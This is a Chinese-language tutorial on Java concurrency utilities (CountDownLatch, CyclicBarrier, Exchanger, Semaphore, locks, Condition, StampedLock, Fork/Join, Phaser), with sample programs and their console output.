package hots.utils;import java.util.Random;import java.util.concurrent.CountDownLatch;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;import java.util.concurrent.atomic.AtomicInteger;import java.util.stream.IntStream;public class CountDownLatchTest {    private final static AtomicInteger count = new AtomicInteger();    private final static Random random = new Random();    private static CountDownLatch latch;    private static ExecutorService executorService = Executors.newFixedThreadPool(2);    public static void main(String[] args) throws InterruptedException {        // step1: 获取查询数据        int[] data = IntStream.rangeClosed(1, 5).map(e -&gt; random.nextInt(1_000)).toArray();        latch = new CountDownLatch(data.length);        // step2：根据查询数据分配多个线程执行        for (int i = 0; i &lt; data.length; i++) {            executorService.submit(new SimpleRunnable(latch, count, i, data[i]));        }        System.out.printf("All works submitted.\n");        latch.await();        executorService.shutdown();        // step3        System.out.printf("All works finished. Support with [%d] threads.\n", count.get());    }    private static class SimpleRunnable implements Runnable {        private final int index;        private final int param;        private final CountDownLatch latch;        private final AtomicInteger count;        SimpleRunnable(CountDownLatch latch, AtomicInteger count, int index, int param) {            this.index = index;            this.param = param;            this.count = count;            this.latch = latch;        }        @Override        public void run() {            try {                Thread.sleep(100);                System.out.printf("%s deal with [%d]-[%d] \n", Thread.currentThread().getName(), index, param);            } catch (InterruptedException e) {                e.printStackTrace();            } finally {                count.incrementAndGet();                latch.countDown();            }        }    }}
All works submitted.pool-1-thread-2 deal with [1]-[546] pool-1-thread-1 deal with [0]-[833] pool-1-thread-2 deal with [2]-[11] pool-1-thread-1 deal with [3]-[247] pool-1-thread-2 deal with [4]-[191] All works finished. Support with [5] threads.
任务拆分离散并行化处理
业务流程如下

基本信息定义

统计表

@Getter@Setterclass Table {    // 表名    private String tableName;    // 原始记录条数    private long sourceRecordCount = 10;    // 传输完成后的记录条数：验证1    private long targetCount;    // 原始schema    private String sourceColumnSchema = "&lt;table name='a'&gt;&lt;column name='c1' type='varchar'&gt;&lt;/column&gt;&lt;/table&gt;";    // 传输完成之后的schema：验证2    private String targetColumnSchema = "";    public Table(String tableName, long sourceRecordCount) {        this.tableName = tableName;        this.sourceRecordCount = sourceRecordCount;    }}

监控工具

abstract class Watcher {    final CountDownLatch countDownLatch;    Watcher(CountDownLatch countDownLatch) {        this.countDownLatch = countDownLatch;    }    abstract void done();}

事件定义（对应一次批处理任务）

@Getter@Setterclass Event {    private String eventName;    public Event(String eventName) {        this.eventName = eventName;    }}

批处理任务完成验证

public class EventTaskBatch extends Watcher {    private final Event event;    EventTaskBatch(Event event, int taskSize) {        super(new CountDownLatch(taskSize));        this.event = event;    }    @Override    void done() {        countDownLatch.countDown();        if (countDownLatch.getCount() == 0) {            // Event涉及到的所有Table任务完成            System.out.println("All table of event " + event.getEventName() + " is finished verify and update continue.");            System.out.println();        }    }}

批处理表验证任务全部完成

class TableTaskBatch extends Watcher {    private final Table table;    /* 每张表存在多个验证任务 */    private EventTaskBatch eventTaskBatch;    TableTaskBatch(EventTaskBatch eventTaskBatch, Table table, int taskSize) {        super(new CountDownLatch(taskSize));        this.table = table;        this.eventTaskBatch = eventTaskBatch;    }    @Override    public void done() {        countDownLatch.countDown();        if (countDownLatch.getCount() == 0) {            // Table相关所有任务完成            System.out.println("All tasks of " + table.getTableName() + " is finished verify and update continue.");            eventTaskBatch.done();        }    }}

表数据验证行为

abstract class TableVerify implements Runnable {    protected final Table table;    protected final TableTaskBatch tableTaskBatch;    public TableVerify(Table table, TableTaskBatch tableTaskBatch) {        this.table = table;        this.tableTaskBatch = tableTaskBatch;    }}
​		a) 验证1：验证数据量
class TrustSourceRecordCount extends TableVerify{    TrustSourceRecordCount(Table table, TableTaskBatch tableTaskBatch) {        super(table, tableTaskBatch);    }    @Override    public void run() {        TaskFactory.spend(ThreadLocalRandom.current().nextInt(10), TimeUnit.SECONDS);        // 设置传输完成之后的数据量        table.setTargetCount(table.getSourceRecordCount());        // 完成一次一张表的验证完成计数        tableTaskBatch.done();    }}
​		b) 验证2：验证表结构
class TrustSourceColumns extends TableVerify {    TrustSourceColumns(Table table, TableTaskBatch tableTaskBatch) {        super(table, tableTaskBatch);    }    @Override    public void run() {        TaskFactory.spend(ThreadLocalRandom.current().nextInt(10), TimeUnit.SECONDS);        table.setTargetColumnSchema(table.getSourceColumnSchema());        // 完成一次一张表的验证完成计数        tableTaskBatch.done();    }}

测试类

public class CountDownLatchTest {    public static void main(String[] args) {        ExecutorService executorService = Executors.newFixedThreadPool(10);        try {            // 不同数据源的数据，批处理            Event[] events = {new Event("Event-1"), new Event("Event-2")};            for (Event event : events) {                // 获取数据源表资源概况                List&lt;Table&gt; tables = capture(event);                EventTaskBatch eventTaskBatch = new EventTaskBatch(event, tables.size());                for (Table table : tables) {                    // 与Table相关的任务技术监控。                    TableTaskBatch tableTaskBatch = new TableTaskBatch(eventTaskBatch, table, 2);                    executorService.submit(new TrustSourceRecordCount(table, tableTaskBatch));                    executorService.submit(new TrustSourceColumns(table, tableTaskBatch));                }            }        } finally {            executorService.shutdown();        }    }    private static List&lt;Table&gt; capture(Event event) {        List&lt;Table&gt; list = new ArrayList&lt;&gt;();        for (int i = 0; i &lt; 10; i++) {            list.add(new Table(event.getEventName() + "-Table-" + i, i * 1000));        }        return list;    }}
测试结果
All tasks of Event-1-Table-3 is finished verify and update continue.All tasks of Event-1-Table-1 is finished verify and update continue.All tasks of Event-1-Table-4 is finished verify and update continue.All tasks of Event-1-Table-6 is finished verify and update continue.All tasks of Event-1-Table-5 is finished verify and update continue.All tasks of Event-1-Table-2 is finished verify and update continue.All tasks of Event-1-Table-0 is finished verify and update continue.All tasks of Event-1-Table-7 is finished verify and update continue.All tasks of Event-1-Table-8 is finished verify and update continue.All tasks of Event-2-Table-4 is finished verify and update continue.All tasks of Event-2-Table-2 is finished verify and update continue.All tasks of Event-2-Table-6 is finished verify and update continue.All tasks of Event-2-Table-3 is finished verify and update continue.All tasks of Event-2-Table-0 is finished verify and update continue.All tasks of Event-1-Table-9 is finished verify and update continue.All table of event Event-1 is finished verify and update continue.All tasks of Event-2-Table-1 is finished verify and update continue.All tasks of Event-2-Table-7 is finished verify and update continue.All tasks of Event-2-Table-9 is finished verify and update continue.All tasks of Event-2-Table-8 is finished verify and update continue.All tasks of Event-2-Table-5 is finished verify and update continue.All table of event Event-2 is finished verify and update continue.
结果分析

每个table的所有验证完成，执行TableTaskBatch的done中的后续操作
每个event的所有table的验证完成，执行EventTaskBatch的done中的后续操作

CyclicBarrier
A synchronization aid that allows a set of threads to all wait for each other to reach a common barrier point. “允许一组线程互相等待到达一个共同的屏障点”的同步算法
public class CyclicBarrierExample1 {    public static void main(String[] args) {        CyclicBarrier barrier = new CyclicBarrier(4, () -&gt; {            System.out.println("All parties action finished");        });        new Thread(new ActionRunnable(barrier), "T1").start();        new Thread(new ActionRunnable(barrier), "T2").start();        new Thread(new ActionRunnable(barrier), "T3").start();        new Thread(new ActionRunnable(barrier), "T4").start();    }    private static class ActionRunnable implements Runnable {        private final CyclicBarrier barrier;        public ActionRunnable(CyclicBarrier barrier) {            this.barrier = barrier;        }        @Override        public void run() {            try {                TaskFactory.spend(ThreadLocalRandom.current().nextInt(10), TimeUnit.SECONDS, false, true);                barrier.await();                System.out.println(Thread.currentThread().getName() + "- await finished");            } catch (InterruptedException e) {                e.printStackTrace();            } catch (BrokenBarrierException e) {                e.printStackTrace();            }        }    }}
测试结果：
T1 finnish task（1651682474323）T4 finnish task（1651682475329）T3 finnish task（1651682480338）T2 finnish task（1651682482329）All parties action finishedT2- await finishedT1- await finishedT4- await finishedT3- await finished
示例2：使用reset()重置
public static void main(String[] args) {    CyclicBarrier barrier = new CyclicBarrier(2, () -&gt; {        System.out.println("All parties action finished");    });    new Thread(new ActionRunnable(barrier), "T1").start();    new Thread(new ActionRunnable(barrier), "T2").start();    TaskFactory.spendSeconds(6);    System.out.println(barrier.getNumberWaiting());    barrier.reset();    TaskFactory.spendSeconds(2);    System.out.println(barrier.getNumberWaiting());}
CountDownLatch 和 CyclicBarrier 的区别



CountDownLatch
CyclicBarrier




不可 reset
可以循环使用的


CountDownLatch工作线程之间互不关心
工作线程互相等待到达一个共同的屏障点



Exchanger

需要成对出现，否则单出来的一个线程同样会进入阻塞状态
如果成对的线程，其中一个无法到达“交换点（Exchange Point）”，另一个会一直等待，直到超时/一直阻塞。
线程对之间交换的对象，是同一个地址的引用，会存在线程不安全的问题，可以考虑使用Atomic包装。

一个同步点，在这个同步点上，线程之间可以组队并互相交换数据。每个线程会在进入交换方法时提供给伙伴线程匹配一些对象，并在返回时接收其伙伴的提供的对象。一个交换器可以被看作是一个同步队列的双向形式。交换器在遗传算法和流水线设计等应用中可能是有用的。
import java.util.concurrent.Exchanger;import java.util.concurrent.TimeUnit;public class ExchangerText {    public static void main(String[] args) {        final Exchanger&lt;String&gt; exchanger = new Exchanger&lt;&gt;();        new Thread(() -&gt; {            TaskFactory.spend(3, TimeUnit.SECONDS, true);            try {                // 交换点，成对的线程同时达到这个交换点才会交换数据                String msg = exchanger.exchange("（message from " + Thread.currentThread().getName() + ".）");                System.out.println(Thread.currentThread().getName() + " got " + msg + "[" + System.currentTimeMillis() + "]");            } catch (InterruptedException e) {                throw new RuntimeException(e);            }        }, "T-A").start();        new Thread(() -&gt; {            TaskFactory.spend(10, TimeUnit.SECONDS, true);            try {                // 交换点，成对的线程同时达到这个交换点才会交换数据                String msg = exchanger.exchange("（message from " + Thread.currentThread().getName() + ".）");                System.out.println(Thread.currentThread().getName() + " got " + msg + "[" + System.currentTimeMillis() + "]");            } catch (InterruptedException e) {                throw new RuntimeException(e);            }        }, "T-B").start();    }}输出结果：T-A finnish task（1651715733432）T-B finnish task（1651715740432）T-B got （message from T-A.）[1651715740432]T-A got （message from T-B.）[1651715740432]
Semaphore
注册/回收许可证


acquire()/release() ： 相当于 acquire(1)/release(1)


acquire(int permits) /release(int permits)


acquireUninterruptibly()/acquireUninterruptibly(int permits)  不可打断，不会抛出InterruptedException异常


drainPermits() 获取所有的许可证


tryAcquire()/tryAcquire(int permits)  不可打断，不会抛出InterruptedException异常，拿不到许可证，不会阻塞，放弃获取，继续执行


getQueueLength() 返回等待获取的线程数的评估值


availablePermits()返回此信号量中可用的当前许可数（评估值）



DEMO-1：可中断的许可证请求（会抛出InterruptedException）

public class SemaphoreExample {    public static void main(String[] args) {        final Semaphore semaphore = new Semaphore(1);        new Thread(new TaskRunnable(semaphore), "T1").start();        new Thread(new TaskRunnable(semaphore), "T2").start();    }    static class TaskRunnable implements Runnable {        private final Semaphore semaphore;        TaskRunnable(Semaphore semaphore) {            this.semaphore = semaphore;        }        @Override        public void run() {            try {                System.out.println(Thread.currentThread().getName() +  " ask for permits");                // 请求执行许可证                semaphore.acquire();                System.out.println(Thread.currentThread().getName() +  " got permits");                TaskFactory.spend(10, TimeUnit.SECONDS, true);            } catch (InterruptedException e) {                throw new RuntimeException(e);            } finally {                // 释放许可证                semaphore.release();            }        }    }}
T1 ask for permitsT1 got permitsT2 ask for permitsT1 finnish task [1651772544344]T2 got permitsT2 finnish task [1651772549361]

DEMO-2

public class SemaphoreExample2 {    public static void main(String[] args) {        final Semaphore semaphore = new Semaphore(1);        new Thread(new TaskRunnable(semaphore), "T1").start();        new Thread(new TaskRunnable(semaphore), "T2").start();    }    static class TaskRunnable implements Runnable {        private final Semaphore semaphore;        TaskRunnable(Semaphore semaphore) {            this.semaphore = semaphore;        }        @Override        public void run() {            try {                // 请求执行许可证                System.out.println(Thread.currentThread().getName() +  " ask for permits");                boolean tryResult = semaphore.tryAcquire();                System.out.println(Thread.currentThread().getName() +  (tryResult ? " got permits" : " ignore permits and continue"));                TaskFactory.spend(2, TimeUnit.SECONDS, true);            } finally {                // 释放许可证                semaphore.release();            }        }    }}
T2 ask for permitsT1 ask for permitsT2 got permitsT1 ignore permits and continueT1 finnish task [1651774206609]T2 finnish task [1651774206609]
Lock包


java中常见锁分类



公平锁和非公平锁
根据多线程竞争时是否排队依次获取锁，synchronized和ReentrantLock实现默认都是非公平锁，非公平锁可以提高效率，避免线程唤醒带来的空档期


可重入锁和不可重复锁
根据同一个线程是否能重复获取同一把锁


共享锁和独占锁(排他锁)
根据多线程是否能共享一把锁，典型的比如ReentrantReadWriteLock，其中读锁是共享锁，写锁是排他锁


可中断锁和不可中断锁
根据正在尝试获取锁的线程是否可中断


悲观锁和乐观锁
根据线程是否锁住共享资源


自旋锁和阻塞锁
根据线程等待的过程



ReentrantLock
ReentrantLock特点：作用同Synchronized，但是拥有一些独有的特性


可重入：ReentrantLock同步块对同一条线程来说是可重入的，不会出现自己把自己锁死的问题


阻塞同步：在成功获取锁的线程执行完之前，会阻塞后面其它线程进入


等待可中断：持有锁的线程长期不释放锁时，正在等待获取锁的线程可以选择放弃等待，改为处理其它事情，主要是tryLock(time)、lockInterruptibly()方法响应支持


实现公平锁：通过new ReentrantLock(true)可以实现多线程在等待同一个锁时，严格按照申请锁的顺序来依次获取锁


锁可以绑定多个条件：一个ReentrantLock对象锁可以同时绑定多个Condition对象


ReentrantLock核心方法解析

lock()：尝试获取锁，如果锁已被其它线程获取则等待，lock()方法不能被中断，在死锁情况下会无限等待
tryLock()：尝试获取锁，如果锁已被其它线程获取则放弃，立即返回boolean类型标识位
tryLock(long var1, TimeUnit var3)：尝试获取锁，如果锁已被其它线程持有则等待var1时间，超时再放弃
lockInterruptibly()：相当于把tryLock(long var1, TimeUnit var3)的时间设置成了无限长，但是在等待获取锁的过程中，线程可以被中断
unlock()：释放锁

ReentrantLock注意事项

ReentrantLock在异常发生时候不会像synchronized锁一样自动释放锁，所以在使用ReentrantLock时候一定要配合try finally使用来进行释放锁（lock.unlock()）
tryLock()方法自带插队属性，也就是说即使设置了new ReentrantLock(true)，使用tryLock()方法获取锁仍然是不公平的

public class ReentrantLockTest {    public static final ReentrantLock lock = new ReentrantLock();    public static void main(String[] args) {        IntStream.rangeClosed(1, 2).forEach(i -&gt; new Thread(() -&gt; needLock()).start());        System.out.println("-----------------------------------");        TaskFactory.spend(10, TimeUnit.SECONDS);        System.out.println("-----------------------------------");        IntStream.rangeClosed(1, 2).forEach(i -&gt; new Thread(() -&gt; tryLock()).start());    }    static void needLock() {        // 不允许打断        lock.lock();        try {            TaskFactory.spend(2, TimeUnit.SECONDS, true);            System.out.println(Thread.currentThread().getName() + " - 取得锁 ：" + lock.isHeldByCurrentThread());        } finally {            lock.unlock();            System.out.println(Thread.currentThread().getName() + " - 释放锁资源：" + !lock.isLocked());        }    }    static void tryLock() {        if (lock.tryLock()) {            // got the lock            try {                TaskFactory.spend(5, TimeUnit.SECONDS, true);                System.out.println(Thread.currentThread().getName() + " - 取得锁 ：" + lock.isHeldByCurrentThread());            } finally {                lock.unlock();                System.out.println(Thread.currentThread().getName() + " - 释放锁资源：" + !lock.isLocked());            }        } else {            // do other things            System.out.println(Thread.currentThread().getName() + " - 未取得锁.");        }    }}
-----------------------------------Thread-0 finnish task [1652021430165]Thread-0 - 取得锁 ：trueThread-0 - 释放锁资源：trueThread-1 finnish task [1652021432181]Thread-1 - 取得锁 ：trueThread-1 - 释放锁资源：true-----------------------------------Thread-3 - 未取得锁.Thread-2 finnish task [1652021443166]Thread-2 - 取得锁 ：trueThread-2 - 释放锁资源：trueProcess finished with exit code 0
ReadWriteLock
需要解决同时读的排他性
public class ReentrantReadWriteLockExample {    public static final ReentrantReadWriteLock lock = new ReentrantReadWriteLock();    public static final ReentrantReadWriteLock.ReadLock readLock = lock.readLock();    public static final ReentrantReadWriteLock.WriteLock writeLock = lock.writeLock();    public static void main(String[] args) {        // new Thread(ReadWriteLockExample::doWriteAction, "A1").start();        // 同时读，不会排他        new Thread(ReentrantReadWriteLockExample::readFiles, "A1").start();        new Thread(ReentrantReadWriteLockExample::readFiles, "A2").start();    }    static void readFiles() {        try {            readLock.lock();            TaskFactory.spend(5, TimeUnit.SECONDS, true);            System.out.println(Thread.currentThread().getName() + " 开始读操作");            TaskFactory.spend(3, TimeUnit.SECONDS);        } finally {            readLock.unlock();            System.out.println(Thread.currentThread().getName() + " 完成读操作");        }    }    static void writeFiles() {        try {            writeLock.lock();            System.out.println(Thread.currentThread().getName() + " 开始写操作");            TaskFactory.spend(3, TimeUnit.SECONDS);        } finally {            writeLock.unlock();            System.out.println(Thread.currentThread().getName() + " 完成写操作");        }    }}
Condition
作用：monitor对象的wait、notify
使用：condition.await()/ condition.signal()，需要配合lock使用
当个等待锁队列
package hots.utils.condition;import java.util.Optional;import java.util.concurrent.TimeUnit;import java.util.concurrent.locks.Condition;import java.util.concurrent.locks.ReentrantLock;/** * @author: DH * @date: 2022/3/5 * @desc: */public class ConditionExample {    private final static ReentrantLock sourceLock = new ReentrantLock();    //  condition 是由lock创建    private final static Condition condition = sourceLock.newCondition();    private static int data = 0;    private static boolean isUsed = false;    public static void main(String[] args) {        new Thread(() -&gt; {            while (true) {                buildData();            }        }).start();        new Thread(() -&gt; {            while (true) {                useData();            }        }).start();    }    private static void buildData() {        try {            sourceLock.lock(); // synchronized 关键词 (monitor enter)            while (!isUsed) {                condition.await();　// monitor await            }            TimeUnit.SECONDS.sleep(1);	            data++;            Optional.of("P：" + data).ifPresent(System.out::println);            isUsed = false;            condition.signal(); // monitor notify        } catch (InterruptedException e) {            e.printStackTrace();        } finally {            sourceLock.unlock(); // monitor end        }    }    private static void useData() {        try {            sourceLock.lock();            while (isUsed) {                condition.await();            }            TimeUnit.SECONDS.sleep(1);            Optional.of("C：" + data).ifPresent(System.out::println);            isUsed = true;            condition.signal();        } catch (InterruptedException e) {            e.printStackTrace();        } finally {            sourceLock.unlock();        }    }}
多个等待锁队列
package practice.util.lock.condition;import practice.common.TaskFactory;import java.util.LinkedList;import java.util.concurrent.TimeUnit;import java.util.concurrent.locks.Condition;import java.util.concurrent.locks.Lock;import java.util.concurrent.locks.ReentrantLock;import java.util.stream.IntStream;/** * 多线程生产、多线程消费 * * @author: DH * @date: 2022/6/12 * @desc: */public class ConditionExample3 {    private static Lock lock = new ReentrantLock();    private static final Condition PRODUCE_COND = lock.newCondition();    private static final Condition CONSUMER_COND = lock.newCondition();    private static final LinkedList&lt;Long&gt; TIMESTAMP_POOL = new LinkedList&lt;&gt;();    private static final int MAX_SIZE = 100;    public static void main(String[] args) {        // 包装多名生产者        IntStream.rangeClosed(1, 5).boxed().forEach(ConditionExample3::doBuildData);        // 包装多名消费者        IntStream.rangeClosed(1, 8).boxed().forEach(ConditionExample3::doConsumeData);    }    private static void doBuildData(int index) {        // 生产者不间断生产数据        new Thread(() -&gt; {            while (true) {                buildData();                TaskFactory.spend(1, TimeUnit.SECONDS);            }        }, "P(" + index + ")").start();    }    private static void doConsumeData(int index) {        // 消费者不间断消费数据        new Thread(() -&gt; {            while (true) {                useData();                TaskFactory.spend(1, TimeUnit.SECONDS);            }        }, "C(" + index + ")").start();    }    private static void buildData() {        try {            lock.lock();            while (TIMESTAMP_POOL.size() &gt; MAX_SIZE) {                PRODUCE_COND.await();            }            TaskFactory.spend(1, TimeUnit.SECONDS);            long value = System.currentTimeMillis();            TIMESTAMP_POOL.addLast(value);            System.out.println(Thread.currentThread() + "-&gt;" + value);            CONSUMER_COND.signalAll();        } catch (InterruptedException e) {            throw new RuntimeException(e);        } finally {            lock.unlock();        }    }    private static void useData() {        try {            lock.lock();            while (TIMESTAMP_POOL.isEmpty()) {                CONSUMER_COND.await();            }            TaskFactory.spend(1, TimeUnit.SECONDS);            long value = TIMESTAMP_POOL.removeFirst();            System.out.println(Thread.currentThread() + "-&gt;" + value);            PRODUCE_COND.signalAll();        } catch (InterruptedException e) {            throw new RuntimeException(e);        } finally {            lock.unlock();        }    }}
StampedLock
产生背景
ReentrantReadWriteLock使得多个读线程同时持有读锁（只要写锁未被占用），而写锁是独占的。
但是，读写锁如果使用不当，很容易产生“写饥饿”问题
比如在读线程非常多，写线程很少的情况下，很容易导致写线程“饥饿”，虽然使用“公平”策略可以一定程度上缓解这个问题，但是“公平”策略是以牺牲系统吞吐量为代价的。
StampedLock的主要特点


所有获取锁的方法，都返回一个邮戳（Stamp），Stamp为0表示获取失败，其余都表示成功；


所有释放锁的方法，都需要一个邮戳（Stamp），这个Stamp必须是和成功获取锁时得到的Stamp一致；


StampedLock是不可重入的；（如果一个线程已经持有了写锁，再去获取写锁的话就会造成死锁）


StampedLock有三种访问模式：
① Reading（读模式）：功能和ReentrantReadWriteLock的读锁类似
② Writing（写模式）：功能和ReentrantReadWriteLock的写锁类似
③ Optimistic reading（乐观读模式）：这是一种优化的读模式。
​	我们知道，在ReentrantReadWriteLock中，当读锁被使用时，如果有线程尝试获取写锁，该写线程会阻塞。
​	但是，在Optimistic reading中，即使读线程获取到了读锁，写线程尝试获取写锁也不会阻塞，这相当于对读模式的优化，但是可能会导致数据不一致的问题。
​	所以，当使用Optimistic reading获取到读锁时，必须对获取结果进行校验。


StampedLock支持读锁和写锁的相互转换
我们知道RRW中，当线程获取到写锁后，可以降级为读锁，但是读锁是不能直接升级为写锁的。
StampedLock提供了读锁和写锁相互转换的功能，使得该类支持更多的应用场景。


无论写锁还是读锁，都不支持Conditon等待


悲观读（读锁和写锁互斥）
package practice.util.lock.stamp;import practice.common.TaskFactory;import java.util.LinkedList;import java.util.Optional;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;import java.util.concurrent.TimeUnit;import java.util.concurrent.locks.StampedLock;import java.util.stream.Collectors;import java.util.stream.IntStream;/** * @author: DH */public class StampedLockTest {    private static final StampedLock STAMPED_LOCK = new StampedLock();    private static final LinkedList&lt;Long&gt; DATA = new LinkedList&lt;&gt;();    public static void main(String[] args) {        final ExecutorService executorService = Executors.newFixedThreadPool(10);        IntStream.rangeClosed(1, 10).forEach(index -&gt; {            if (index % 9 == 0) {                // 写数据                executorService.submit(() -&gt; {                    while (true) {                        write();                    }                });            } else {                // 读数据                executorService.submit(() -&gt; {                    while (true) {                        read();                    }                });            }        });    }    public static void read() {        long stamp = -1;        try {            // 获取锁，并获取时间戳            stamp = STAMPED_LOCK.readLock();            Optional.of(DATA.stream().map(String::valueOf).collect(Collectors.joining("、", "R-", "")))                    .ifPresent(System.out::println);            TaskFactory.spend(1, TimeUnit.SECONDS);        } finally {            // 按照时间戳释放锁            STAMPED_LOCK.unlockRead(stamp);        }    }    public static void write() {        long stamp = -1;        try {            stamp = STAMPED_LOCK.writeLock();            long value = System.currentTimeMillis();            DATA.addLast(value);            System.out.println("C:" + value);        } finally {            STAMPED_LOCK.unlockWrite(stamp);        }    }}
乐观读：Optimistic reading
“Optimistic reading”的使用必须遵循以下模式：
long stamp = lock.tryOptimisticRead();  // 非阻塞获取版本信息copyVaraibale2ThreadMemory();           // 拷贝变量到线程本地堆栈if(!lock.validate(stamp)){              // 校验在拷贝过程中有没有排他锁抢占，如果有则悲观读    long stamp = lock.readLock();       // 获取读锁    try {        copyVaraibale2ThreadMemory();   // 拷贝变量到线程本地堆栈     } finally {       lock.unlock(stamp);              // 释放悲观锁    }}useThreadMemoryVarables();              // 使用线程本地堆栈里的数据进行操作
以下为乐观读DEMO：
package practice.util.lock.stamp;import practice.common.TaskFactory;import java.util.ArrayList;import java.util.List;import java.util.Optional;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;import java.util.concurrent.TimeUnit;import java.util.concurrent.locks.StampedLock;import java.util.stream.Collectors;import java.util.stream.IntStream;/** * 乐观读 * * @author: DH * @date: 2022/6/12 * @desc: */public class StampedLockOptimisticTest {    private static final StampedLock stampedLock = new StampedLock();    private static final List&lt;Long&gt; DATA = new ArrayList&lt;&gt;();    public static void main(String[] args) {        final ExecutorService executorService = Executors.newFixedThreadPool(10);        IntStream.rangeClosed(1, 10).forEach(index -&gt; {            if (index % 8 == 0) {                // 写数据                executorService.submit(() -&gt; {                    while (true) {                        write();                    }                });            } else {                // 读数据                executorService.submit(() -&gt; {                    while (true) {                        optimisticRead();                    }                });            }        });    }    public static void optimisticRead() {        // 获取锁，并获取时间戳        long stamp = stampedLock.tryOptimisticRead();        // 乐观读，必须先拷贝一份数据到在方法中        List&lt;Long&gt; local = new ArrayList&lt;&gt;();        local.addAll(DATA);        // 检查在拷贝过程中有没有排他锁抢占，如果有则悲观读        if (!stampedLock.validate(stamp)) {            stamp = stampedLock.readLock();            try {                System.out.println("&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; 重新读取数据到本地 &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;");                local.clear();                local.addAll(DATA);            } finally {                stampedLock.unlockRead(stamp);            }        }        // 使用数据        Optional.of(local.stream().map(String::valueOf).collect(Collectors.joining("、", "R-", "")))                .ifPresent(System.out::println);        TaskFactory.spend(1, TimeUnit.SECONDS);    }    public static void write() {        long stamp = stampedLock.writeLock();        try {            long value = System.currentTimeMillis();            System.out.println("W-" + value);            System.out.println();            DATA.add(value);        } finally {            stampedLock.unlockWrite(stamp);        }    }}
Fork/Join框架


Fork/Join任务的原理：判断一个任务是否足够小，如果是，直接计算，否则，就分拆成几个小任务分别计算。这个过程可以反复“裂变”成一系列小任务。


基于工作窃取算法（work-stealing）


Fork/Join机制可能只能在单个jvm上运行


RecursiveTask：有返回
public abstract class RecursiveTask&lt;V&gt; extends ForkJoinTask&lt;V&gt;
实验demo : 1~10000 求和
import java.util.concurrent.ExecutionException;import java.util.concurrent.ForkJoinPool;import java.util.concurrent.ForkJoinTask;import java.util.concurrent.RecursiveTask;import java.util.stream.IntStream;/** * @author: DH * @date: 2022/6/20 * @desc: */public class RecursiveTaskDemo {    // 可执行容量    private static final int TASK_CAPACITY = 3;    public static void main(String[] args) {        final ForkJoinPool forkJoinPool = new ForkJoinPool();        ForkJoinTask&lt;Integer&gt; future = forkJoinPool.submit(new CalculateRecursiveTask(1, 100));        System.out.println("================== other tasks ====================");        try {            System.out.println("================== action results " + future.get());        } catch (InterruptedException e) {            e.printStackTrace();        } catch (ExecutionException e) {            e.printStackTrace();        } finally {            forkJoinPool.shutdown();        }    }    // 计算    private static class CalculateRecursiveTask extends RecursiveTask&lt;Integer&gt; {        private final int start;        private final int end;        public CalculateRecursiveTask(int start, int end) {            if (end &gt;= start) {                this.start = start;                this.end = end;            } else {                this.end = start;                this.start = end;            }        }        @Override        protected Integer compute() {            if (end - start &lt;= TASK_CAPACITY) {                // 执行任务                return IntStream.rangeClosed(start, end).sum();            } else {                // 拆分任务                int middle = (end + start) / 2;                CalculateRecursiveTask taskLeft = new CalculateRecursiveTask(start, middle);                CalculateRecursiveTask taskRight = new CalculateRecursiveTask(middle + 1, end);                // 加入ForkJoinPool.WorkQueue                 taskLeft.fork();                // 加入ForkJoinPool.WorkQueue                 taskRight.fork();                // 等待任务执行完成并返回                return taskLeft.join() + taskRight.join();            }        }    }}
RecursiveAction：无返回
如果有返回值，需要构造一个共同访问区域。
import java.util.Optional;import java.util.concurrent.ForkJoinPool;import java.util.concurrent.RecursiveAction;import java.util.concurrent.TimeUnit;import java.util.concurrent.atomic.AtomicInteger;import java.util.stream.IntStream;/** * @author: DH * @date: 2022/6/20 * @desc: */public class RecursiveActionDemo {    //  线程共享    private static final AtomicInteger SUM_RESULT = new AtomicInteger();    // 可执行容量    private static final int TASK_CAPACITY = 3;    public static void main(String[] args) {        final ForkJoinPool forkJoinPool = new ForkJoinPool();        try {            forkJoinPool.submit(new CalculateRecursiveActon(1, 100));            while (forkJoinPool.getActiveThreadCount() &gt; 0) {                // 等待执行完成                System.out.println(forkJoinPool.getActiveThreadCount());                TaskFactory.spend(1, TimeUnit.NANOSECONDS);            }            Optional.of(SUM_RESULT).ifPresent(System.out::println);        } finally {            forkJoinPool.shutdown();        }    }    private static class CalculateRecursiveActon extends RecursiveAction {        private final int start;        private final int end;        public CalculateRecursiveActon(int start, int end) {            if (end &gt;= start) {                this.start = start;                this.end = end;            } else {                this.end = start;                this.start = end;            }        }        @Override        protected void compute() {            if (end - start &lt;= TASK_CAPACITY) {                SUM_RESULT.getAndAdd(IntStream.rangeClosed(start, end).sum());            } else {                int middle = (end + start) / 2;                // 任务拆分                CalculateRecursiveActon left = new CalculateRecursiveActon(start, middle);                CalculateRecursiveActon right = new CalculateRecursiveActon(middle + 1, end);                // 任务入池                left.fork();                right.fork();            }        }    }}
Phaser
监控方法

public int getRegisteredParties()返回在当前phase上注册的party数目
public int getArrivedParties()返回已经到达当前phase的party的数量，如果这个phaser已经终止，返回值是无意义和任意的
public int getUnarrivedParties()返回还未到达当前phase的party的数量，如果这个phaser已经终止，返回值是无意义和任意的
public final int getPhase()返回当前阶段号, 最大值是Integer.MAX_VALUE，到达最大值之后，从0重新计数

public class PhaserExample4 {    public static void main(String[] args) {        final Phaser phaser = new Phaser(5);        phaser.bulkRegister(5);        monitor(1, "phaser.getRegisteredParties", phaser.getRegisteredParties());        monitor(1, "phaser.getArrivedParties", phaser.getArrivedParties());        new Thread(phaser::arriveAndAwaitAdvance).start();        monitor(2, "phaser.getArrivedParties", phaser.getArrivedParties());        monitor(2, "phaser.getUnarrivedParties", phaser.getUnarrivedParties());    }    static void monitor(int index, String item, Object object) {        System.out.printf("【%s】【monitor-%d】【%30s】%s\n", Thread.currentThread().getName(), index, item, object);    }}
动态注册特性
public int register() 动态注册
public int bulkRegister(int parties)批量注册
public int arriveAndAwaitAdvance() 类似CyclicBarrier 的await方法
